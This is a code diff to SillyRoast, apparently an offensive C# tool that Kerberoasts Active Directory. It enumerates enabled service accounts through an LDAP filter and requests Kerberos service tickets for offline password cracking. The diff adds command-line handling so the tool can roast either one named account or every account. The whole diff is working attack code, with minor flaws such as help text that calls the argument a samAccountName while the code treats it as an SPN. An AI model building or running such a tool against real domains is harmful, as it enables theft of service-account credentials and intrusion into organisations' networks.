@@ -2,6 +2,8 @@
 using System.Collections.Generic;
 using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
+using System.Linq;
+using System.Net.NetworkInformation;
 using Asn1;
 
 
@@ -44,13 +46,10 @@ namespace SillyRoast
             return spns.ToArray();
         }
 
-        static bool Kerberoast(string[] args)
+        static bool Kerberoast(string[] spns)
         {
-
             string domain = Domain.GetComputerDomain().ToString();
-            string spnFilter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
-            string[] spns = Query(spnFilter);
-
+                        
             System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
             for (int i = 0; i < spns.Length; i++)
             {
@@ -121,10 +120,28 @@ namespace SillyRoast
 
             try
             {
-                bool didgood = Kerberoast(args);
-                if (didgood)
+                if (args.Length > 0 && args.Contains("--help") || args.Contains("-h"))
                 {
-                    Console.WriteLine("[+] SillyRoast completed...");
+                    Console.WriteLine("Kerberoast a potentially specified account, otherwise roast everything\nUsage:\n\tSillyRoast.exe [samAccountName]\n");
+
+                }
+                else if (args.Length > 0 && !args.Contains("--help") && !args.Contains("-h")) 
+                {
+                    bool didgood = Kerberoast(args);
+                    if (didgood)
+                    {
+                        Console.WriteLine("[+] SillyRoast completed...");
+                    }
+                }
+                else
+                {
+                    string spnFilter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
+                    string[] spns = Query(spnFilter);
+                    bool didgood = Kerberoast(spns);
+                    if (didgood)
+                    {
+                        Console.WriteLine("[+] SillyRoast completed...");
+                    }
                 }
             
             }
